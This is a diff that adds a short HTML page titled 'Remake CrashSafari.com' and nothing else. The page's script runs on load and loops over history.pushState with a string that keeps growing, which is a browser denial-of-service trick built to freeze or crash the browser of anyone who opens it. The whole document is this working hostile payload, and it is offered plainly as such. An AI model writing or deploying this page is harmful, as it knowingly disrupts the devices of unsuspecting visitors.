@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<h1>Remake CrashSafari.com</h1>
+<script>
+	var total = "";
+	for (var i = 0; i < 100000; i++) {
+		for(var j = 0; j < 100000; j++) {
+			total = total + i.toString() + j.toString();
+			history.pushState(0,0, total );
+			console.log(total)
+		}
+	}
+</script>
+</body>
+</html>
